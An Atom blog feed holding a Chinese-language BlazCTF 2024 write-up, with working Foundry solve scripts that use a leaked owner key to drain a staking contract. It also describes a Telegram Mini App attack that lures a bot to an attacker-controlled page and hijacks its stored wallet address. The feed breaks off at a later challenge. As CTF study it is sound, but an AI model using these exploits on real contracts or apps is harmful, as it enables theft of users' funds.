<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ching367436</title>
  
  
  <link href="https://blog.ching367436.me/atom.xml" rel="self"/>
  
  <link href="https://blog.ching367436.me/"/>
  <updated>2024-09-23T06:21:49.000Z</updated>
  <id>https://blog.ching367436.me/</id>
  
  <author>
    <name>Ching367436</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BlazCTF 2024</title>
    <link href="https://blog.ching367436.me/blazctf-2024/"/>
    <id>https://blog.ching367436.me/blazctf-2024/</id>
    <published>2024-09-23T06:21:49.000Z</published>
    <updated>2024-09-23T06:21:49.000Z</updated>
    
    <content type="html"><![CDATA[<p><a class="link" href="https://ctftime.org/event/2492/">BlazCTF 2024 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是我第一場 Web3 CTF，做個以後可以回來複製貼上的紀錄。這次是跟<a class="link" href="https://ctftime.org/team/280959">竹狐 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打），比賽時間剛好撞到修的網路安全事務與社會密集課程 QQ。題目品質整體算滿不錯的。官方的題目在 <a class="link" href="https://github.com/fuzzland/blazctf-2024/tree/main%E3%80%82">https://github.com/fuzzland/blazctf-2024/tree/main。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Ciao"><a href="#Ciao" class="headerlink" title="Ciao"></a>Ciao</h3><p>Welcome 題，給了一個 <a class="link" href="https://app.sentio.xyz/tx/42161/0xd58271ed821a19fa5af95245e2be55782cad67f46556aa437e1af157267ce6d4?nav=s">transaction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，然後 flag 在 transaction 的一個 calldata 裡面。把他丟進 <a class="link" href="https://gchq.github.io/CyberChef/#recipe=From_Hex('None')From_Hex('Auto')&input=MzI2NTMyMzkzMDM5NjQzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMjMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMzNjQzNjM3MzY2NDMyMzEzMjMwMzUzNDM2MzgzNjM1MzIzMDM2MzYzNjYzMzYzMTM2MzczMjMwMzYzOTM3MzMzMjMwMzYzMjM2NjMzNjMxMzc2MTM3NjIzNTM3MzMzMzM2NjMzNjMzMzMzMDM2NjQzNjM1MzU2NjM1MzQzMzMwMzU2NjM1MzQzNjM4MzMzMzM1NjYzNzMwMzMzNDM3MzIzNzM0MzczOTM1NjYzNDY1MzMzMDM3MzczNTY2MzQzNzMzMzAzMzMwMzYzNDM1NjYzNDYzMzczNTM2MzMzNjYyMzU2NjM2NjQzNDM2MzMzMzM1MzIzNzY0MzAzMDMwMzAzMDMw">CipherChef <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡面就有 flag 了。</p><p><img src="/blazctf-2024/ciao.webp" alt="ciao"></p><h3 id="BigenLayer"><a href="#BigenLayer" class="headerlink" title="BigenLayer"></a>BigenLayer</h3><h4 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import {ERC20} from "./ERC20.sol";</span><br><span class="line"></span><br><span class="line">contract iPhone16 is ERC20 {</span><br><span class="line">    // [...]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract BigenLayer {</span><br><span class="line">    address public immutable owner;</span><br><span class="line">    iPhone16 public immutable token;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public stakedBalance;</span><br><span class="line">    mapping(address =&gt; uint256) public withdrawalRequestTime;</span><br><span class="line">    mapping(address =&gt; uint256) public pendingWithdrawals;</span><br><span class="line">    mapping(address =&gt; address) public withdrawalRecipient;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner, iPhone16 _token) {</span><br><span class="line">        owner = _owner;</span><br><span class="line">        token = _token;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function stake(address onBehalf, uint256 amount) external {</span><br><span class="line">        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");</span><br><span class="line">        stakedBalance[onBehalf] += amount;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _requestWithdrawal(address user, uint256 amount, address recipient) internal {</span><br><span class="line">        require(stakedBalance[user] &gt;= amount, "Insufficient balance");</span><br><span class="line">        stakedBalance[user] -= amount;</span><br><span class="line">        pendingWithdrawals[user] += amount;</span><br><span class="line">        withdrawalRequestTime[user] = block.timestamp;</span><br><span class="line">        withdrawalRecipient[user] = recipient;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function requestWithdrawal(uint256 amount, address recipient) external {</span><br><span class="line">        _requestWithdrawal(msg.sender, amount, recipient);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function adminRequestWithdrawal(address user, uint256 amount, address recipient) external {</span><br><span class="line">        require(msg.sender == owner, "Only owner can call this function");</span><br><span class="line">        _requestWithdrawal(user, amount, recipient);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function finalizeWithdrawal(address user) external {</span><br><span class="line">        uint256 amount = pendingWithdrawals[user];</span><br><span class="line">        require(amount &gt; 0, "No pending withdrawal");</span><br><span class="line">        require(block.timestamp &gt;= withdrawalRequestTime[user] + 12 seconds, "Withdrawal too early");</span><br><span class="line">        address recipient = withdrawalRecipient[user];</span><br><span class="line">        pendingWithdrawals[user] = 0;</span><br><span class="line">        require(token.transfer(recipient, amount), "Transfer failed");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Challenge {</span><br><span class="line">    address public immutable PLAYER;</span><br><span class="line">    BigenLayer public immutable bigen;</span><br><span class="line">    iPhone16 public immutable token;</span><br><span class="line"></span><br><span class="line">    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line"></span><br><span class="line">    constructor(address player) {</span><br><span class="line">        PLAYER = player;</span><br><span class="line">        token = new iPhone16();</span><br><span class="line">        bigen = new BigenLayer(OWNER, token);</span><br><span class="line"></span><br><span class="line">        token.approve(address(bigen), type(uint256).max);</span><br><span class="line">        bigen.stake(TIM_COOK, 16 * 10 ** 18);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) {</span><br><span class="line">        return token.balanceOf(PLAYER) &gt;= 16 * 10 ** 18;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h4><p><code>BigenLayer.OWNER</code> 的 private key 是 <code>0x1337</code>，用 <code>OWNER</code> 權限來 <code>BigenLayer.adminRequestWithdrawal</code> 即可。</p><h4 id="解題環境細節"><a href="#解題環境細節" class="headerlink" title="解題環境細節"></a>解題環境細節</h4><h5 id="0-環境建置-Dev-Containers"><a href="#0-環境建置-Dev-Containers" class="headerlink" title="0. 環境建置 (Dev Containers)"></a>0. 環境建置 (<a class="link" href="https://code.visualstudio.com/docs/devcontainers/tutorial">Dev Containers <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</h5><p>這邊會使用 <a class="link" href="https://damnvulnerabledefi.xyz/">Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 所建置的 Dev container。在開始前需先安裝好 VSCode 跟 Docker。</p><p>接著到 <a class="link" href="https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0">Damn Vulnerable DeFi 的 repository <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，裡面有個資料夾叫做 <a class="link" href="https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/.devcontainer">.devcontainer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。把他整個載下來放到題目給的 Foundry project 資料夾裡。</p><img src="/blazctf-2024/devcontainer-folder.webp" alt="devcontainer-folder" style="width: 20em;"><p>接著使用 VSCode 打開 .devcontainer 的上層資料夾。VSCode 會問要不要在 Container 裡打開，點選 Reopen in Container。接著我們就有一個在 Docker 裡面的 foundry 環境了 🎉</p><img src="/blazctf-2024/devcontainer-prompt.webp" alt="devcontainer-prompt" style="width: 42em;"><p>接著記得將題目的環境變數設好。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc bigen-layer.chal.ctf.so 1337</span><br><span class="line">ticket? d7965f43-9211-4501-9594-9f13733ef833</span><br><span class="line">1 - launch new instance</span><br><span class="line">2 - <span class="built_in">kill</span> instance</span><br><span class="line">3 - get flag</span><br><span class="line">action? 1</span><br><span class="line">creating private blockchain...</span><br><span class="line">deploying challenge...</span><br><span class="line"></span><br><span class="line">your private blockchain has been <span class="built_in">set</span> up</span><br><span class="line">it will automatically terminate <span class="keyword">in</span> 1440 seconds</span><br><span class="line">---</span><br><span class="line">rpc endpoints:</span><br><span class="line">    - http://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main</span><br><span class="line">    - ws://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main/ws</span><br><span class="line">private key:        0x440b27e18d2945173d24fc364512cb627d80263fac79182704519fd77ee06735</span><br><span class="line">challenge contract: 0x93254FaE56400134F9b2592B156C9d0267950d97</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">export</span> RPC=http://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main</span><br><span class="line">&gt; <span class="built_in">export</span> PLAYER=0x440b27e18d2945173d24fc364512cb627d80263fac79182704519fd77ee06735</span><br><span class="line">&gt; <span class="built_in">export</span> CHALLENGE=0x93254FaE56400134F9b2592B156C9d0267950d97</span><br></pre></td></tr></table></figure></div><h5 id="1-給-OWNER-送一些-ethers，讓他能送-transaction"><a href="#1-給-OWNER-送一些-ethers，讓他能送-transaction" class="headerlink" title="1. 給 OWNER 送一些 ethers，讓他能送 transaction"></a>1. 給 <code>OWNER</code> 送一些 ethers，讓他能送 transaction</h5><h6 id="script-Solve-pre-pre-s-sol"><a href="#script-Solve-pre-pre-s-sol" class="headerlink" title="script/Solve_pre_pre.s.sol"></a>script/Solve_pre_pre.s.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "forge-ctf/CTFSolver.sol";</span><br><span class="line">import "forge-std/Script.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract Solve is Script {</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line">    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;</span><br><span class="line">    uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));</span><br><span class="line">    uint256 OwnerPrivateKey = 0x0000000000000000000000000000000000000000000000000000000000001337;</span><br><span class="line"></span><br><span class="line">    function run() external {</span><br><span class="line">        address challenge = vm.envAddress("CHALLENGE");</span><br><span class="line">        solve(challenge, vm.addr(playerPrivateKey));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function solve(address challenge, address player) internal {</span><br><span class="line">        vm.startBroadcast(playerPrivateKey);</span><br><span class="line"></span><br><span class="line">        (bool success,) = OWNER.call{value: 1000000000000000}("");</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The script path may be different</span></span><br><span class="line">forge script --fork-url <span class="variable">$RPC</span> script/Solve_pre_pre.s.sol -vvvv --broadcast --legacy</span><br></pre></td></tr></table></figure></div><p>Or</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast send --private-key <span class="variable">$PLAYER</span> --value 1000000000000000 --rpc-url <span class="variable">$RPC</span> --legacy <span class="variable">$OWNER</span> <span class="string">'0x'</span></span><br></pre></td></tr></table></figure></div><h5 id="2-利用-OWNER-身分來-BigenLayer-adminRequestWithdrawal"><a href="#2-利用-OWNER-身分來-BigenLayer-adminRequestWithdrawal" class="headerlink" title="2. 利用 OWNER 身分來  BigenLayer.adminRequestWithdrawal"></a>2. 利用 <code>OWNER</code> 身分來  <code>BigenLayer.adminRequestWithdrawal</code></h5><h6 id="script-Solve-pre-s-sol"><a href="#script-Solve-pre-s-sol" class="headerlink" title="script/Solve_pre.s.sol"></a><code>script/Solve_pre.s.sol</code></h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "forge-ctf/CTFSolver.sol";</span><br><span class="line">import "forge-std/Script.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract Solve is Script {</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line">    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;</span><br><span class="line">    uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));</span><br><span class="line">    uint256 OwnerPrivateKey = 0x0000000000000000000000000000000000000000000000000000000000001337;</span><br><span class="line"></span><br><span class="line">    function run() external {</span><br><span class="line">        address challenge = vm.envAddress("CHALLENGE");</span><br><span class="line">        solve(challenge, vm.addr(playerPrivateKey));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function solve(address challenge, address player) internal {</span><br><span class="line">        vm.startBroadcast(OwnerPrivateKey);</span><br><span class="line"></span><br><span class="line">        BigenLayer bigenLayer = Challenge(challenge).bigen();</span><br><span class="line">        bigenLayer.adminRequestWithdrawal(TIM_COOK, 16 * 10 ** 18, player);</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge script --fork-url <span class="variable">$RPC</span> script/Solve_pre.sol -vvvv --broadcast --legacy</span><br></pre></td></tr></table></figure></div><h5 id="3-Finalize-Withdrawal"><a href="#3-Finalize-Withdrawal" class="headerlink" title="3. Finalize Withdrawal"></a>3. Finalize Withdrawal</h5><h6 id="script-Solve-post-sol"><a href="#script-Solve-post-sol" class="headerlink" title="script/Solve_post.sol"></a>script/Solve_post.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "forge-ctf/CTFSolver.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract Solve is CTFSolver {</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line">    function solve(address challenge, address player) internal override {</span><br><span class="line">        BigenLayer bigenLayer = Challenge(challenge).bigen();</span><br><span class="line">        bigenLayer.finalizeWithdrawal(TIM_COOK);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>這邊直接繼承了 forge-ctf/CTFSolver.sol，所以只要把 <code>CHALLENGE</code> 跟 <code>PLAYER</code> 的環境變數設好，其他部分就不用自己寫了。(<code>PLAYER</code> 的環境變數是 player 的 private key)，執行這部的時候要跟前一步距離一些時間來滿足 <code>bigenLayer.finalizeWithdrawal</code>  的條件。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge script --fork-url <span class="variable">$RPC</span> script/Solve_post.sol -vvvv --broadcast --legacy</span><br></pre></td></tr></table></figure></div><h3 id="Tonyallet"><a href="#Tonyallet" class="headerlink" title="Tonyallet"></a>Tonyallet</h3><h4 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h4><blockquote><p>Tony Ads #2 After his DeFi dreams crashed, Tony pivoted to SocialFi, crafting a buzzword-laden pitch that had VCs practically throwing money at him, all while he secretly chuckled at the irony of his newfound success.</p><p>Ping @tonyalletbot on Telegram! You can also report posts at <a class="link" href="https://tonyallet-us-report.ctf.so/">https://tonyallet-us-report.ctf.so/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>題目給了一個 <a class="link" href="https://core.telegram.org/bots/webapps">Telegram Mini App <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可以透過 Telegram 打開其網頁與其互動。題目還給了 Report bot，他會做以下<a class="link" href="https://docs.google.com/document/d/1YMkYTSOmG_Dg9OIsVlCGAKfvMPYYij9ZVCSXIPqFwes/edit?usp=sharing">步驟 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p><img src="/blazctf-2024/tony-wallet-step12.webp" alt="tony-wallet-step12" style="width: 25em;"><img src="/blazctf-2024/tony-wallet-step34.webp" alt="tony-wallet-step12" style="width: 25em;"><h4 id="題解-1"><a href="#題解-1" class="headerlink" title="題解"></a>題解</h4><p>Bot 會去看 <code>/post?id=&lt;user_provided_id&gt;</code> 頁面，裡面用了 DomPurify 所以很難 XSS（如下），但是題目說 bot 會去點擊按鈕。可以透過製造一個很大的 <code>&lt;a&gt;</code> 讓 bot 點進我們可控的網頁。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getPost</span>(<span class="params">postId</span>) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/posts/<span class="subst">${postId}</span>`</span>, {</span><br><span class="line">            <span class="attr">method</span>: <span class="string">'GET'</span></span><br><span class="line">        });</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">        <span class="keyword">const</span> postDetails = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'postDetails'</span>);</span><br><span class="line">        postDetails.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(</span><br><span class="line">            <span class="string">`</span></span><br><span class="line"><span class="string">            &lt;h3&gt;<span class="subst">${data.title}</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;<span class="subst">${data.content}</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Author Hash: <span class="subst">${data.author}</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Timestamp: <span class="subst">${<span class="keyword">new</span> <span class="built_in">Date</span>().toISOString()}</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">        `</span>, { <span class="attr">USE_PROFILES</span>: { <span class="attr">html</span>: <span class="literal">true</span> } }</span><br><span class="line">        );</span><br><span class="line">    } <span class="keyword">catch</span> (error) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">'Error fetching post:'</span>, error);</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">'Failed to retrieve post. Please check the UUID and try again.'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">goBack</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">back</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> query = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span><br><span class="line"><span class="keyword">const</span> pid = query.<span class="title function_">split</span>(<span class="string">"="</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="title function_">getPost</span>(pid);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 我們的巨大 <span class="tag">&lt;<span class="name">a</span>&gt;</span> 按鈕</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://&lt;attacker_c2_server&gt;/"</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%;position:fixed;background:#ff0;top:0;left:0;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>在我們可控的頁面，把 bot 重新導向到帶著我們自己 <code>#tgWebAppData</code> 的 Telegram Mini App 首頁網址（如下）。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    location = <span class="string">'https://tonyallet-us.ctf.so/#tgWebAppData=query_id...'</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>這樣 bot browser 的 localStorage 的 <code>walletAddress</code> 就會被設成我們的 address。當 bot 再次進入首頁時，抓到的就會是我們的 address（如下），所以會送 Ether 進來我們的 address，就解了。他 flag 給的方式有點通靈，會藏在流量裡。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const tg = window.Telegram.WebApp || {</span><br><span class="line">    initData: 123</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">async function getWallet(bypass=false) {</span><br><span class="line">    let localAddress = localStorage.getItem("walletAddress")</span><br><span class="line">    if (localAddress &amp;&amp; !bypass) {</span><br><span class="line">        document.getElementById('walletAddress').textContent = localAddress;</span><br><span class="line">        return</span><br><span class="line">    }</span><br><span class="line">    try {</span><br><span class="line">        const response = await fetch(`/wallet`, {</span><br><span class="line">            method: 'GET',</span><br><span class="line">            headers: {</span><br><span class="line">                'Authorization': tg.initData</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line">        const data = await response.json();</span><br><span class="line">        document.getElementById('walletAddress').textContent = data.address;</span><br><span class="line">        localStorage.setItem("walletAddress", data.address);</span><br><span class="line">    } catch (error) {</span><br><span class="line">        console.error('Error fetching wallet:', error);</span><br><span class="line">        alert('Failed to generate wallet. Please try again.');</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">// [...]</span><br><span class="line">getWallet()</span><br></pre></td></tr></table></figure></div><h3 id="Cyber-Cartel"><a href="#Cyber-Cartel" class="headerlink" title="Cyber Cartel"></a>Cyber Cartel</h3><h4 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 